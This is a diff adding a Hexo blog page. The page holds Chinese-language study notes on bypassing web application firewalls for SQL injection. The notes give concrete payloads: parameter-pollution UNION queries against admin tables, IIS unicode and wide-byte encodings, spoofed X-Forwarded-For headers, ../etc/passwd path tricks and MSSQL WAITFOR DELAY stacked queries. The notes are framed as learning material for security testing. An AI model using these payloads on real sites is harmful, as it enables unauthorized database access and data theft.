@@ -1,0 +1,1287 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+(function(){
+ if(''){
+ if (prompt('请输入文章密码') !== ''){
+                 alert('密码错误！');
+                                 history.back();
+                                             
+ }
+         
+ }
+     
+ })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-mac-osx.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="v1rus blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Waf Bypass技巧0x01 前言​    实际生产环境中即使存在版本的漏洞但是由于waf的存在可能导致exp无法在服务器内部执行，所以根据各种各样的环境情况需要具体分析，具体fuzz。很早就想展开这个系列，快点学习！ 一下主要是在看wafbypass公众号上学习的整理笔记。 waf防护一般有：云waf，硬件waf，软件waf等。 一、利用服务器特性主要是利用服务器端对一些特殊字符或者特服字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="waf bypass&#x2F;waf bypass技巧">
+<meta property="og:url" content="https://virusday.github.io/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="v1rus blog">
+<meta property="og:description" content="Waf Bypass技巧0x01 前言​    实际生产环境中即使存在版本的漏洞但是由于waf的存在可能导致exp无法在服务器内部执行，所以根据各种各样的环境情况需要具体分析，具体fuzz。很早就想展开这个系列，快点学习！ 一下主要是在看wafbypass公众号上学习的整理笔记。 waf防护一般有：云waf，硬件waf，软件waf等。 一、利用服务器特性主要是利用服务器端对一些特殊字符或者特服字符">
+<meta property="article:published_time" content="2020-12-05T11:39:49.125Z">
+<meta property="article:modified_time" content="2020-12-06T09:50:38.735Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2020/12/05/waf bypass/waf bypass技巧/"/>
+
+
+
+
+
+  <title>waf bypass/waf bypass技巧 | v1rus blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1rus blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1rus blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">waf bypass/waf bypass技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-05T19:39:49+08:00">
+                2020-12-05
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-06T17:50:38+08:00">
+                2020-12-06
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Waf-Bypass技巧"><a href="#Waf-Bypass技巧" class="headerlink" title="Waf Bypass技巧"></a>Waf Bypass技巧</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    实际生产环境中即使存在版本的漏洞但是由于waf的存在可能导致exp无法在服务器内部执行，所以根据各种各样的环境情况需要具体分析，具体fuzz。很早就想展开这个系列，快点学习！ 一下主要是在看wafbypass公众号上学习的整理笔记。</p>
+<p>waf防护一般有：云waf，硬件waf，软件waf等。</p>
+<h2 id="一、利用服务器特性"><a href="#一、利用服务器特性" class="headerlink" title="一、利用服务器特性"></a>一、利用服务器特性</h2><p>主要是利用服务器端对一些特殊字符或者特服字符组合的特性去绕过解析</p>
+<h3 id="1、-特性（ASP-IIS）"><a href="#1、-特性（ASP-IIS）" class="headerlink" title="1、%特性（ASP+IIS）"></a>1、%特性（ASP+IIS）</h3><p>在该环境下当们我输入s%elect的时候，解析出来的结果为select。</p>
+<p>猜测可能是iis下asp.dll解析时候的问题，aspx+iis的环境就没有这个特性。</p>
+<h3 id="2、-u特性（asp-iis和aspx-iis）"><a href="#2、-u特性（asp-iis和aspx-iis）" class="headerlink" title="2、%u特性（asp+iis和aspx+iis）"></a>2、%u特性（asp+iis和aspx+iis）</h3><p>iis服务器支持对unicode的解析。</p>
+<p>对于select中的字符进行unicode编码：s%u006c%u0006ect ，这种字符在IIS接收到之后会被转换为select</p>
+<h3 id="3、另类-u特性（ASP-IIS）"><a href="#3、另类-u特性（ASP-IIS）" class="headerlink" title="3、另类%u特性（ASP+IIS）"></a>3、另类%u特性（ASP+IIS）</h3><p>利用的是unicode在iis解析之后会被转换成multibyte（多字符集，另一种编码方式，为了解决各国之间编码有重叠），</p>
+<p>多个widechar可能转化为一个字符</p>
+<p>s%u0065lect-&gt;select s%u00f0lect-&gt;select </p>
+<h3 id="4、apache畸形method"><a href="#4、apache畸形method" class="headerlink" title="4、apache畸形method"></a>4、apache畸形method</h3><p>在GET请求中，GET可以替换为任意参数名字，不影响apahce接收参数id=？。</p>
+<p>比如将GET请求换成ABC</p>
+<h2 id="二、应用层特性"><a href="#二、应用层特性" class="headerlink" title="二、应用层特性"></a>二、应用层特性</h2><h3 id="1、大小写-关键词的替换。"><a href="#1、大小写-关键词的替换。" class="headerlink" title="1、大小写/关键词的替换。"></a>1、大小写/关键词的替换。</h3><p>列举的可以很多去拓展。</p>
+<h3 id="2、双重url编码"><a href="#2、双重url编码" class="headerlink" title="2、双重url编码"></a>2、双重url编码</h3><p>默认在代码层面会做一次url解码，传输的时候也做了一次解码。</p>
+<h3 id="3、变更请求方式"><a href="#3、变更请求方式" class="headerlink" title="3、变更请求方式"></a>3、变更请求方式</h3><p>这里在我前一节http编码传输绕过一节中有提及过，自定义boundary传输绕过。</p>
+<h3 id="4、HPP参数污染-重点"><a href="#4、HPP参数污染-重点" class="headerlink" title="4、HPP参数污染(重点)"></a>4、HPP参数污染(重点)</h3><p>类似?id=1&amp;id=2&amp;id=3的形式，此种形式在获取id值的时候不同的web技术获取的值是不一样的。</p>
+<p>假设提交的参数即为：</p>
+<p>id=1&amp;id=2&amp;id=3 </p>
+<p>得到的结果： </p>
+<p>Asp.net + iis：id=1,2,3 </p>
+<p>Asp + iis：id=1,2,3 </p>
+<p>Php + apache：id=3</p>
+<p>多种变形：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MSSQL: </span><br><span class="line">大小写+参数污染：?id&#x3D;1 UNION&#x2F;*&amp;ID&#x3D;*&#x2F;SELECT 1,2&#x2F;*&amp;Id&#x3D;*&#x2F;FROM ADMIN </span><br><span class="line"></span><br><span class="line">GET+POST形式: </span><br><span class="line">http:&#x2F;&#x2F;192.168.125.140&#x2F;test&#x2F;sql.aspx?id&#x3D;1 union&#x2F;* </span><br><span class="line">post: id&#x3D;2*&#x2F;select null,null,null </span><br><span class="line"></span><br><span class="line">利用逗号：?id&#x3D;1 union select 1&amp;id&#x3D;2&amp;id&#x3D;3&amp;id&#x3D;4 from admin--（无逗号形式） </span><br><span class="line">?a&#x3D;1+union&#x2F;*&amp;b&#x3D;*&#x2F;select+1,pass&#x2F;*&amp;c&#x3D;*&#x2F;from+users--(分割参数注入) </span><br><span class="line"></span><br><span class="line">无效参数形式： ?a&#x3D;&#x2F;*&amp;sql&#x3D;xxx&amp;b&#x3D;*&#x2F; </span><br><span class="line">备注：a,b为无效参数，让waf误以为我们输入的语句是在注释符里面执行的所以就不拦截</span><br><span class="line"></span><br><span class="line">溢出形式：?id&#x3D;1&#x2F;*&amp;id&#x3D;*&#x2F;&#x2F;*&amp;id&#x3D;*&#x2F;&#x2F;*......&amp;id&#x3D;*&#x2F;&#x2F;*&amp;id&#x3D;*&#x2F; union select null,system_user,null from INFORMATION_SCHEMA.schemata </span><br><span class="line">Mysql： ?id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;….. &amp;id&#x3D;1 union select 1,2 from admin</span><br><span class="line"></span><br><span class="line">在这里额外提一句，对单个无效参数的溢出绕waf。</span><br><span class="line">a&#x3D;600w个a&amp;id&#x3D;...这里适用于post请求，因为要发很多个包。</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、宽字节（利用度不高）"><a href="#5、宽字节（利用度不高）" class="headerlink" title="5、宽字节（利用度不高）"></a>5、宽字节（利用度不高）</h3><p><strong>基本概念：</strong></p>
+<p>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节</p>
+<p><strong>利用情况：</strong></p>
+<p>设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入，编码转换从而导致的注入漏洞。</p>
+<p><strong>例子：</strong></p>
+<p>?id=%df%27</p>
+<p>这时,假如我们现在使用的是<code>addslashes</code>来过滤,那么就会发生如下的转换过程<br>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>宽字节关键字对照表</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">union &#x3D; uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节 </span><br><span class="line"></span><br><span class="line">select &#x3D; こхlх%уt &#x2F;&#x2F;t不编码 其他的都宽字节 中间插上% </span><br><span class="line"></span><br><span class="line">from &#x3D; цR%яэ &#x2F;&#x2F;宽字节+% </span><br><span class="line"></span><br><span class="line">空格&#x3D;%20&#x3D;%ва &#x2F;&#x2F;в是2的款字符 а是0的宽字符 </span><br><span class="line"></span><br><span class="line">, &#x3D; Ь &#x2F;&#x2F;,号的宽字节</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、WAF层特性"><a href="#三、WAF层特性" class="headerlink" title="三、WAF层特性"></a>三、WAF层特性</h2><h3 id="1、逻辑问题"><a href="#1、逻辑问题" class="headerlink" title="1、逻辑问题"></a>1、逻辑问题</h3><p>3和4两种可利用也不高。</p>
+<p>1、云waf保护，比如绕过cdn，直接对真实的ip进行访问绕过。</p>
+<p>2、没做http到https的跳转，导致只针对https的防护在访问http服务时不起作用。</p>
+<p>3、如果针对get参数过滤，如果同时提交get和post，忽略了post参数，绕过。</p>
+<p>4、特殊符号 %00截断。</p>
+<h3 id="2、性能问题"><a href="#2、性能问题" class="headerlink" title="2、性能问题"></a>2、性能问题</h3><p>1、设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。①只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。②提交前100个无效参数</p>
+<p>比如文件上传异常的检测看看有没有特征值进行匹配，因为一般现在的waf是根据正则表达式进行匹配的。但是因为性能设定了检测特定数量的字符时，只要填充无效字符避过检测即可。</p>
+<p>2、不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p>
+<p>3、多次重复提交同一个请求，有些通过了WAF，有些被WAF所拦截了，应该性能问题导致部分请求bypass。</p>
+<h3 id="3、白名单"><a href="#3、白名单" class="headerlink" title="3、白名单"></a>3、白名单</h3><p><strong>1、IP白名单</strong></p>
+<p>从网络层获取的ip，这种一般伪造不来，如果是应用层的获取的IP，这样就可能存在伪造白名单IP造成bypass。</p>
+<p>测试方法：修改http的header来bypass waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for </span><br><span class="line"></span><br><span class="line">X-remote-IP </span><br><span class="line"></span><br><span class="line">X-originating-IP </span><br><span class="line"></span><br><span class="line">x-remote-addr </span><br><span class="line"></span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、静态资源</strong></p>
+<p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php&#x2F;1.js?id&#x3D;1 </span><br><span class="line">备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、url白名单</strong></p>
+<p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php&#x2F;admin.php?id&#x3D;1 </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;..&#x2F;..&#x2F;..&#x2F;manage&#x2F;..&#x2F;sql.asp?id&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>waf通过/manage/“进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?</p>
+<p>a=/manage/&amp;b=../etc/passwd 绕过防御规则。</p>
+<p><strong>4、爬虫白名单</strong></p>
+<p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p>
+<p>1、 根据User-Agent 2、通过行为来判断</p>
+<h2 id="四、数据库特性"><a href="#四、数据库特性" class="headerlink" title="四、数据库特性"></a>四、数据库特性</h2><h3 id="1、Mysql数据库特性"><a href="#1、Mysql数据库特性" class="headerlink" title="1、Mysql数据库特性"></a>1、Mysql数据库特性</h3><p>利用一些数据库特性来进行WAF绕过。在Mysql中，比如可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内联注释： &#x2F;*!12345union*&#x2F;select </span><br><span class="line">Mysql黑魔法: select&#123;x user&#125;from&#123;x mysql.user&#125;; </span><br><span class="line">换行符绕过:%23%0a、%2d%2d%0a    %23 # ; %2d -</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h4><p>常见有5个位置即：select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,<strong>user()</strong>【位置四】from【位置五】admin</p>
+<h3 id="2、-SQLServer数据库特性"><a href="#2、-SQLServer数据库特性" class="headerlink" title="2、 SQLServer数据库特性"></a>2、 SQLServer数据库特性</h3><p>利用一些数据库特性来进行WAF绕过。在MSSQL中，比如可以这样：</p>
+<p>浮点数形式：id=1.1union select </p>
+<p>科学计数法形式：id=1e0union select </p>
+<p>但其实还可以这样子：id=1.eunion select</p>
+<p>通过1.e这样的形式，我曾用它绕过了D盾的SQL注入防护，通过简单的Fuzz，我们来一起探索一下MSsql特性。</p>
+<h4 id="0x02-特性"><a href="#0x02-特性" class="headerlink" title="0x02 特性"></a>0x02 特性</h4><p>（1）空白字符</p>
+<p>Mssql可以利用的空白字符（00-20）：</p>
+<p>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F, </p>
+<p>20</p>
+<p>（2）注释符号</p>
+<p>Mssql也可以使用注释符号 /**/     %2f%2a%2a%2f</p>
+<p>（3）浮点数</p>
+<p>select * from admin where id=1.1union select 1,’2’,db_name() from admin</p>
+<p>（4）1E0的形式：</p>
+<p>select * from admin where id=1e0union select 1,’2’,db_name() from admin</p>
+<p>（5）运算符</p>
+<p>包括加(+)、减(-)、乘(*)、除(/)、求于(%)、位与（&amp;）、位或（|）、位异或（^）</p>
+<p>select username,password,id from admin where id=1-1union select ‘1’,system_user,3 from admin</p>
+<p>select username,password,id from admin where id=1e-union select ‘1’,system_user,3 from admin</p>
+<p>（6）小区别：</p>
+<p>ASPX：[0x00-0x20]、ox2e、[0x30-0x39]、ox45、ox65、[0x80-0xffff]、运算符</p>
+<p>ASP   :  [0x01-0x20]、ox2e、[0x30-0x39]、ox45、ox65、运算符</p>
+<p>单引号：select username,password,id from admin where id=1 and ‘1’like’1’union select null,null,null</p>
+<p>（7）其他符号</p>
+<h4 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h4><p>常见有5个位置即：select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,<strong>db_name()</strong>【位置四】from【位置五】admin</p>
+<p><strong>位置一（参数和union）：</strong></p>
+<p>方式1-6填充</p>
+<p><strong>位置二（union与select）</strong></p>
+<p>方式1-2、7填充</p>
+<p>： %3a 冒号</p>
+<p>select * from admin where id=1 union:select 1,’2’,db_name() from:admin</p>
+<p>ASPX：[0x00-0x20]、0x3a、[0x80-0xffff]要组合前面的两个才能执行，如%3a%a0、%a0%0a</p>
+<p>ASP   :  [0x01-0x20] 、0x3a</p>
+<p><strong>位置三（select和查询参数）：</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>%2b + select * from admin where id=1 union select+1,’2’,db_name() from admin</p>
+<p>%2d - select * from admin where id=1 union select-1,’2’,db_name() from admin</p>
+<p>%2e . select * from admin where id=1 union select.1,’2’,db_name() from admin</p>
+<p>%3a : select * from admin where id=1 union select:1,’2’,db_name() from admin</p>
+<p>%7e ~ select * from admin where id=1 union select~1,’2’,db_name() from admin</p>
+<p><strong>位置四：查询参数和from</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>ASP: [0x01-0x20]、0x2e、[0x30-0x39]、0x45、0x65、[0x80-0xffff]</p>
+<p>ASPX：[0x00-0x20]、0x2e、[0x30-0x39]、0x45、0x65、</p>
+<p>id=1%20union%20select%201,’2’,db_name()%80from%20admin</p>
+<p>db_name与()中间 %00-%20 %80-%ffff填充</p>
+<p>id=1 union select 1,’2’,db_name+() from admin</p>
+<p><strong>位置五：from后面的位置</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>： %3a select * from admin where id=1 union:select 1,’2’,db_name() from:admin</p>
+<p>. %2e select * from admin where id=1 union select 1,’2’,db_name() from.information_schema.SCHEMATA</p>
+<p>ASPX： [0x00-0x20]、0x2e、0x3a、[0x80-0xffff]</p>
+<p>ASP  ： [0x01-0x20]、0x2e、0x3a</p>
+<h4 id="0x03-常见函数"><a href="#0x03-常见函数" class="headerlink" title="0x03 常见函数"></a>0x03 常见函数</h4><p><strong>类型一、字符串截取函数</strong></p>
+<p>Substring(@@version,1,1)</p>
+<p>Left(@@version,1)</p>
+<p>Right(@@version,1)</p>
+<p>charindex(‘test’,db_name())</p>
+<p><strong>类型二：字符串转换函数</strong></p>
+<p>Ascii(‘a’)</p>
+<p>Char(‘97’) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</p>
+<p><strong>类型三：其他方式</strong></p>
+<p>利用存储过程</p>
+<p>mssql的存储过程定义为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;Declare @s varchar(5000) &#96;&#96;&#x2F;&#x2F;申明变量@s 类型为varchar(5000)&#96;&#96;Set @ &#96;&#96;&#x2F;&#x2F;给@s变量赋值 &#96;&#96;Exec(@s) &#96;&#96;&#x2F;&#x2F;执行@s&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>id=1;Exec(‘WA’+’ITFOR DELAY ‘’0:0:5’’’)</p>
+<p>id=1;declare @test nvarchar(50);set @test=’wait’+’for delay ‘’0:0:5’’’;exec sp_executesql @test</p>
+<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>1、首先填充方式：MSSQL可以看出来<strong>%00-%20的填充符号</strong>、<strong>注释符号</strong>、<strong>特殊符号交集</strong>在这些中间是通用的，先fuzz这些通用符号（00-20,2a,2f,2e,3a），如果都不行，那么ASP可能首先没办法绕过（因为位置二的关系）。aspx再针对每个位置去fuzz。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/" rel="next" title="XSS绕过总结/XSS深入">
+                <i class="fa fa-chevron-left"></i> XSS绕过总结/XSS深入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="prev" title="jsp一句话木马/jsp一句话木马">
+                jsp一句话木马/jsp一句话木马 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/user.jpg"
+                alt="Virusday" />
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
